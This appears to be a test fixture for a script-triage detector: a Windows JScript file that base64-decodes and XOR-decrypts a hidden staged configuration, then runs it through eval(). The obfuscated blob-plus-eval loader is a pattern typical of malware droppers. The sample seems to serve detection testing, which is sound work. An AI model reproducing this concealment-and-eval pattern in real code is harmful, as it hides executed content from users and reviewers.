// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
function decodeBase64(text) {
  var alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  var clean = text.replace(/[^A-Za-z0-9+\/=]/g, "");
  var output = [];
  for (var p = 0; p < clean.length; p += 4) {
    var a = alphabet.indexOf(clean.charAt(p));
    var b = alphabet.indexOf(clean.charAt(p + 1));
    var c = clean.charAt(p + 2) == "=" ? -1 : alphabet.indexOf(clean.charAt(p + 2));
    var d = clean.charAt(p + 3) == "=" ? -1 : alphabet.indexOf(clean.charAt(p + 3));
    output.push((a << 2) | (b >> 4));
    if (c >= 0) output.push(((b & 15) << 4) | (c >> 2));
    if (d >= 0) output.push(((c & 3) << 6) | d);
  }
  return output;
}
var decode_71a7d539 = function(storedMaterial) {
  var keyBytes = [230,133,19,195,108];
  var recoveredMaterial = [];
  for (var i = 0; i < storedMaterial.length; i++) { recoveredMaterial.push(storedMaterial[i] ^ keyBytes[i % keyBytes.length]); }
  return recoveredMaterial;
};
var recover_00f0b9f5 = function() {
  var packedText = "nadgtwmW9jH5N8TkcLIZj/d2nB6D6Hy3CcSpMbQej/F2nAqP6XbhQMTherAch/FwqzOW93ygCZX2Me9OjuR9pwOA40ywD5TsY7dOu6kxogiH9WemHsS/MY4Fhfd8sAOA8T2bIarNR5c8xKkxtQ2K8HawTtz+MaANi/VyqguI2nqnTtyncKIBluR6pALL5yGmVdaxJaZagKc/4RmU6TH5To7xZ7Mf3Ko8oV6DvCP3WoOzde0JnuR+swCDq3qtGofpeqdDg7Yq8FiHtSXtCIfxMe9Ok/Z2sTOH4natGMS/MYsZiPFhph+VyXKhQ4S3dvpc0rN29QrEqTGlBYrgTLMNku0x+U6lv0+fOZXgYbAwutVmoQCP5k+fJJPrZ7EJlfZfog662WC3DYHgPqFeg7wj91qDs3XtCIfxMe9OlOB0qh+S92qcHIfxe+FWxM1YgDm62UCsCpLycrEJutlbtgKS93awH6rkcZ8wouxgswOV5HGvCbrZcfEJ37Un9QnQ4zHvTojga7czlfFypAnEvzGxCZXqZrEPg6hgogGW6XbtHJW0Mb5AxPZnoguDxny2ApKnKfcR";
  var storedMaterial = decodeBase64(packedText);
  var harmlessValue = [3, 5, 8, 13].slice(1, 3);
  var recoveredMaterial = [];
  var state = 1;
  switch (state) { case 1: recoveredMaterial = decode_71a7d539(storedMaterial); break; default: recoveredMaterial = []; }
  var configurationText = recoveredMaterial.length ? String.fromCharCode(recoveredMaterial[0]) : "", bi = 1;
  for (bi = 1; bi < recoveredMaterial.length; bi++) { configurationText = configurationText.concat(String.fromCharCode(recoveredMaterial[bi])); }
  return configurationText;
};
var inspect_9c88533c = function() {
  var configuration = eval("(" + recover_00f0b9f5() + ")");
  var analysisPlan = new Object();
  analysisPlan["steps"] = configuration["steps"];
  analysisPlan["adapter"] = configuration["adapter"];
  analysisPlan["values"] = configuration["values"];
  analysisPlan["stageCount"] = configuration["stageCount"];
  return analysisPlan;
};
